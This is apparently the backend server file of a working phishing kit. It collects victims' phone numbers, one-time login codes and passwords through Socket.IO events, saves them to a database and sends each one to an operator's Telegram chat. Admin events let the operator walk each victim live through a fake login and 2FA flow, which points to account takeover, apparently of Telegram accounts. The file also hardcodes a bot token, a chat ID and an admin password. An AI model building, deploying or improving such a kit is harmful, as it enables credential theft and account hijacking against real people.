// NODE v20.11.1 ----------------------------------------
// NPM v8.14.0   ----------------------------------------

require("dotenv").config();
require('module-alias/register');

const botToken = process.env.BOT_TOKEN || "8374543782:AAEY9pVB39AIZBsDtmfsq4pUlIUP_rqC-jw";
const CHAT_ID = process.env.CHAT_ID || "-1003860485157";

const axios = require("axios");
const { createServer } = require("http");
const http = require("http");
const { Server } = require("socket.io");
const { parse } = require("url");

const db = require('@db');
// const { startBot, bot } = require('./app/bot');

const ADMIN_PASSWORD = '22042013d';

// Функция для парсинга cookies
function parseCookies(cookieHeader) {
    const cookies = {};
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const parts = cookie.trim().split('=');
            if (parts.length === 2) {
                cookies[parts[0]] = parts[1];
            }
        });
    }
    return cookies;
}

// HTML страница входа
const loginPage = `<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            background: #000000;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        .login-container {
            background: #000000;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #ffffff;
            margin-bottom: 48px;
            font-size: 32px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            margin-bottom: 12px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 400;
            text-align: left;
            opacity: 0.8;
        }
        input[type="password"] {
            width: 100%;
            padding: 16px;
            background: #1a1a1a;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 8px;
            font-size: 17px;
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            transition: all 0.2s ease;
            -webkit-appearance: none;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #ffffff;
            background: #1f1f1f;
        }
        input[type="password"]::placeholder {
            color: #666666;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #ffffff;
            color: #000000;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 8px;
        }
        button:hover {
            background: #f5f5f5;
        }
        button:active {
            background: #e5e5e5;
            transform: scale(0.98);
        }
        .error {
            color: #ff3b30;
            margin-top: 16px;
            text-align: center;
            font-size: 14px;
            display: none;
            font-weight: 400;
        }
        .error.show {
            display: block;
        }
        @media (prefers-color-scheme: light) {
            body {
                background: #ffffff;
                color: #000000;
            }
            .login-container {
                background: #ffffff;
            }
            h1 {
                color: #000000;
            }
            label {
                color: #000000;
                opacity: 0.6;
            }
            input[type="password"] {
                background: #f5f5f5;
                color: #000000;
                border-color: #d1d1d1;
            }
            input[type="password"]:focus {
                border-color: #000000;
                background: #ffffff;
            }
            button {
                background: #000000;
                color: #ffffff;
            }
            button:hover {
                background: #1a1a1a;
            }
            button:active {
                background: #333333;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Вход</h1>
        <form id="loginForm" method="POST" action="/admin-check">
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required autofocus placeholder="Введите пароль">
            </div>
            <button type="submit">Продолжить</button>
            <div class="error" id="error">Неверный пароль</div>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('error');
            
            if (!password) {
                e.preventDefault();
                errorDiv.classList.add('show');
                setTimeout(() => {
                    errorDiv.classList.remove('show');
                }, 3000);
            }
        });
    </script>
</body>
</html>`;

const server = createServer((req, res) => {
    // Получаем URL без query параметров
    const pathname = req.url.split('?')[0];
    const method = req.method;
    
    // Если это корневой путь "/", возвращаем 404
    if (pathname === '/') {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('404 Not Found');
        return;
    }
    
    // Страница входа
    if (pathname === '/admin-login') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(loginPage);
        return;
    }
    
    // Проверка пароля
    if (pathname === '/admin-check' && method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const params = new URLSearchParams(body);
            const password = params.get('password');
            
            if (password === ADMIN_PASSWORD) {
                // Устанавливаем cookie на 7 дней
                const expires = new Date();
                expires.setTime(expires.getTime() + (7 * 24 * 60 * 60 * 1000));
                const host = req.headers.host || 'tgstat.eu';
                const protocol = req.headers['x-forwarded-proto'] || 'https';
                const redirectUrl = `${protocol}://${host}/userconnect/testfish`;
                
                res.writeHead(302, {
                    'Location': redirectUrl,
                    'Set-Cookie': `admin_auth=authenticated; expires=${expires.toUTCString()}; path=/; SameSite=Lax; HttpOnly; Secure`
                });
                res.end();
            } else {
                // Неверный пароль - показываем страницу входа с ошибкой
                const errorPage = loginPage.replace(
                    '<div class="error" id="error">Неверный пароль</div>',
                    '<div class="error show" id="error">Неверный пароль</div>'
                );
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end(errorPage);
            }
        });
        return;
    }
    
    // Проверка доступа к админ-панели
    if (pathname === '/userconnect/testfish' || pathname === '/testfish') {
        const cookies = parseCookies(req.headers.cookie);
        
        if (cookies.admin_auth === 'authenticated') {
            // Проксируем на React приложение (порт 8999)
            const targetPath = '/testfish';
            const proxyReq = http.request({
                hostname: '127.0.0.1',
                port: 8999,
                path: targetPath,
                method: req.method,
                headers: {
                    ...req.headers,
                    host: '127.0.0.1:8999',
                    'x-forwarded-for': req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || ''
                }
            }, (proxyRes) => {
                // Копируем заголовки ответа
                const responseHeaders = { ...proxyRes.headers };
                delete responseHeaders['content-length']; // Удаляем content-length, так как мы используем pipe
                res.writeHead(proxyRes.statusCode, responseHeaders);
                proxyRes.pipe(res);
            });
            req.pipe(proxyReq);
            proxyReq.on('error', (err) => {
                console.error('Proxy error:', err);
                res.writeHead(502, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end('Bad Gateway');
            });
            return;
        } else {
            // Перенаправляем на страницу входа
            const host = req.headers.host || 'tgstat.eu';
            const protocol = req.headers['x-forwarded-proto'] || 'https';
            res.writeHead(302, { 'Location': `${protocol}://${host}/admin-login` });
            res.end();
            return;
        }
    }
    
    // Для Socket.IO путей не обрабатываем здесь - Socket.IO сам обработает
});
const io = new Server(server, {
    transports: ["polling", "websocket"],
    cors: {
      origin: "*",
    }
});

function sendTelegram(text) {
    console.log('sendTelegram called with:', { botToken: botToken ? 'exists' : 'missing', CHAT_ID, text });
    
    if (!botToken || !CHAT_ID) {
        console.error('BOT_TOKEN or CHAT_ID is missing!');
        return;
    }
    
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "HTML"
    }).then(response => {
        console.log('Сообщение отправлено успешно:', response.data);
    })
    .catch(error => {
        console.error('Ошибка при отправке сообщения:', error.response?.data || error.message);
    });
}

const namespace = io.of("userconnect");

namespace.on("connection", (socket) => {
    console.log('socket connect', socket.id);

    socket.join(socket.id);

    socket.on('new-visitor', async (data) => {
        console.log('new-visitor event received:', data);

        const { username, first_name, last_name, from } = data;
        const fromText = from ? `@${from}` : 'unknown';
        
        try{
            // Находим или создаем пользователя по socket_id
            let user = await db.users.findOne({ where: { socket_id: socket.id }});
            
            if (!user) {
                // Создаем нового пользователя
                user = await db.users.create({ socket_id: socket.id });
            }
            
            const userId = user.user_id;
            const new_message = `Пользователь ${userId} перешел, со страницы ${fromText}`;
            
            console.log('Sending telegram message:', new_message);
            sendTelegram(new_message);

            const chat = await db.chats.findOne({ where: { chat_id: 1 }});

            if(chat){
                const new_message = `Пользователь перешел на сайт со страницы ${fromText}`;
                // sendTelegram(new_message);
            }

        } catch(e){
            console.log('ERROR NEW_VISITOR:', e)
        }
    })

    socket.on('phone', async (data) => {
        console.log(data);
        try{
            const phone = `+${data.phone.code} ${data.phone.phone}`;
            const fromText = data.from ? `@${data.from}` : 'unknown';
            
            // Находим или создаем пользователя
            let user = await db.users.findOne({ where: { socket_id: socket.id }});
            
            if (!user) {
                // Создаем нового пользователя
                user = await db.users.create({ phone: phone, socket_id: socket.id });
            } else {
                // Обновляем телефон существующего пользователя
                user.phone = phone;
                await user.save();
            }

            const userId = user.user_id;
            const new_message = `Пользователь ${userId} ввёл номер <code>${phone}</code>, со страницы ${fromText}`;
            sendTelegram(new_message);
        } catch(e){
            console.log('ERROR PHONE:', e);
        }
    })

    socket.on('code', async (data) => {
        console.log(data, "CODEEEE");
        
        const fromText = data.from ? `@${data.from}` : 'unknown';
        
        try{
            const user = await db.users.findOne({ where: { socket_id: socket.id }})
            
            if(user){
                user.code = data.code;
                await user.save();
                
                const userId = user.user_id;
                const new_message = `Пользователь ${userId} ввёл код <code>${data.code}</code>, со страницы ${fromText}`;
                sendTelegram(new_message);
            } else {
                // Если пользователь не найден, создаем нового
                const newUser = await db.users.create({ socket_id: socket.id, code: data.code });
                const new_message = `Пользователь ${newUser.user_id} ввёл код <code>${data.code}</code>, со страницы ${fromText}`;
                sendTelegram(new_message);
            }
        } catch(e){
            console.log('ERROR CODE:', e);
        }
    });

    socket.on('password', async (data) => {
        console.log(data, "PASSWORD");
        
        const fromText = data.from ? `@${data.from}` : 'unknown';
        const password = data.password || 'не указан';

        try{
            const user = await db.users.findOne({ where: { socket_id: socket.id }})
            
            if(user){
                user.password = data.password;
                await user.save();
                
                const userId = user.user_id;
                const new_message = `Пользователь ${userId} ввёл пароль <code>${password}</code>, со страницы ${fromText}`;
                sendTelegram(new_message);
            } else {
                // Если пользователь не найден, создаем нового
                const newUser = await db.users.create({ socket_id: socket.id, password: data.password });
                const new_message = `Пользователь ${newUser.user_id} ввёл пароль <code>${password}</code>, со страницы ${fromText}`;
                sendTelegram(new_message);
            }

            // запись в бд, code и socket.id
        } catch(e){
            console.log('ERROR PASSWORD:', e);
        }
    })

    socket.on('get-users', async (data, cb) => {
        try{
            const users = await db.users.findAll({ limit: 20, order: [['user_id', 'DESC']] });

            cb && cb(users)
        }catch(e){
            console.log(e)
        }
    });

    socket.on('next', async (data) => {
        try{
            namespace.sockets.get(data.socket_id).emit('next', { data: 'hello' });

        }catch(e){
            console.log(e)
        }
    });
    socket.on('admin:2fa', async (data) => {
        try{
            namespace.sockets.get(data.socket_id).emit('2fa', { data: 'hello' });

        }catch(e){
            console.log(e)
        }
    });
    socket.on('admin:error-2fa', async (data) => {
        try{
            namespace.sockets.get(data.socket_id).emit('error-password', { data: 'hello' });

        }catch(e){
            console.log(e)
        }
    });
    socket.on('admin:error-code', async (data) => {
        console.log('admin error code')
        try{
            namespace.sockets.get(data.socket_id).emit('error-code', { data: 'hello' });

        }catch(e){
            console.log(e)
        }
    });
    socket.on('admin:delete', async (data) => {
        console.log('delete')
        try{
            
            const user = await db.users.findOne({ where: { user_id: data.user_id} });
            if(user){
                console.log(user);
                user.destroy();

            }
        }catch(e){
            console.log(e)
        }
    });
    
});


(async () => {
    try {
        await db.sequelize.authenticate();

        //await db.sequelize.sync({ force: true });
        //await db.init_default_data();

        server.listen(process.env.PORT, async () => {
          console.log(`Сервер стартовал на ${process.env.PORT} порту!`);
          
          // startBot();
        });
        
    } catch (e) {
        console.log(e);
    }
})();
